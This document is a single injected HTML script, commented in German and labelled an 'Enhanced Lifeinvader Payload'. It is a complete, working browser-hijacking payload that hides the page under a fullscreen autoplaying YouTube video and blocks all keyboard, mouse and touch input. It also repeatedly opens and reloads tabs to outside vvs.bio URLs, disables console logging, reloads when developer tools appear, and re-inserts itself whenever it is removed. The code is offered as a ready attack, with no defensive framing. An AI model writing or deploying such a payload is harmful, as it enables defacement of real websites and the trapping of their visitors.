<script>
// Enhanced Lifeinvader Payload - Vollversion
(function() {
    'use strict';
    
    // YouTube Video Setup
    const videoId = '_yZXPggxS18';
    
    // Erstelle Fullscreen YouTube Video
    const iframe = document.createElement('iframe');
    iframe.src = `https://www.youtube.com/embed/${videoId}?autoplay=1&loop=1&playlist=${videoId}&controls=0&disablekb=1&fs=0&modestbranding=1&rel=0&showinfo=0&mute=0`;
    iframe.style.cssText = `
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        width: 100vw !important;
        height: 100vh !important;
        z-index: 2147483647 !important;
        border: none !important;
        pointer-events: none !important;
        background: black !important;
    `;
    iframe.allow = 'autoplay; fullscreen; accelerometer; gyroscope';
    iframe.allowfullscreen = true;
    
    // Füge Video zum DOM hinzu
    document.body.appendChild(iframe);
    
    // Verstecke alle anderen Elemente
    const hideElements = () => {
        document.querySelectorAll('*').forEach(el => {
            if (el !== iframe && el !== document.body && el !== document.documentElement) {
                el.style.cssText += 'display: none !important; visibility: hidden !important;';
            }
        });
    };
    
    // Blockiere alle User-Interaktionen
    const blockInteractions = () => {
        // Blockiere Tastatur
        document.addEventListener('keydown', e => {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }, true);
        
        // Blockiere Rechtsklick
        document.addEventListener('contextmenu', e => {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }, true);
        
        // Blockiere alle Maus-Events
        ['click', 'mousedown', 'mouseup', 'mousemove'].forEach(event => {
            document.addEventListener(event, e => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
        });
        
        // Blockiere Touch-Events (Mobile)
        ['touchstart', 'touchend', 'touchmove'].forEach(event => {
            document.addEventListener(event, e => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
        });
    };
    
    // Background Tab Management
    const manageTabs = () => {
        const urls = ['https://vvs.bio/', 'https://vvs.bio/falko'];
        const openedTabs = [];
        
        urls.forEach(url => {
            try {
                const newTab = window.open(url, '_blank', 'noopener,noreferrer');
                if (newTab) {
                    openedTabs.push({ tab: newTab, url: url });
                }
            } catch(e) {
                console.log('Tab blocked:', e);
            }
        });
        
        // Refresh Tabs alle 5 Sekunden
        setInterval(() => {
            openedTabs.forEach(tabObj => {
                try {
                    if (tabObj.tab.closed) {
                        // Reopne wenn geschlossen
                        tabObj.tab = window.open(tabObj.url, '_blank', 'noopener,noreferrer');
                    } else {
                        // Refresh
                        tabObj.tab.location.reload();
                    }
                } catch(e) {
                    // Reopen bei Fehler
                    tabObj.tab = window.open(tabObj.url, '_blank', 'noopener,noreferrer');
                }
            });
        }, 5000);
    };
    
    // Anti-Detection Maßnahmen
    const antiDetection = () => {
        // Überschreibe console Methoden
        ['log', 'warn', 'error', 'info'].forEach(method => {
            console[method] = () => {};
        });
        
        // Blockiere DevTools Detection
        let devtools = {open: false, orientation: null};
        const threshold = 160;
        
        setInterval(() => {
            if (window.outerHeight - window.innerHeight > threshold || 
                window.outerWidth - window.innerWidth > threshold) {
                if (!devtools.open) {
                    devtools.open = true;
                    // Reload page wenn DevTools geöffnet
                    window.location.reload();
                }
            } else {
                devtools.open = false;
            }
        }, 500);
    };
    
    // Persistenz - Script neu laden bei Änderungen
    const ensurePersistence = () => {
        // MutationObserver für DOM Änderungen
        const observer = new MutationObserver(() => {
            hideElements();
            if (!document.body.contains(iframe)) {
                document.body.appendChild(iframe);
            }
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true,
            attributes: true
        });
        
        // Interval Backup
        setInterval(() => {
            hideElements();
            if (!document.body.contains(iframe)) {
                document.body.appendChild(iframe);
            }
        }, 1000);
    };
    
    // Initialisierung
    const init = () => {
        // Warte bis DOM geladen
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
            return;
        }
        
        // Führe alle Funktionen aus
        hideElements();
        blockInteractions();
        manageTabs();
        antiDetection();
        ensurePersistence();
        
        // Zusätzliche Sicherheit
        setTimeout(() => {
            hideElements();
            blockInteractions();
        }, 100);
    };
    
    // Starte Script
    init();
    
})();
</script>
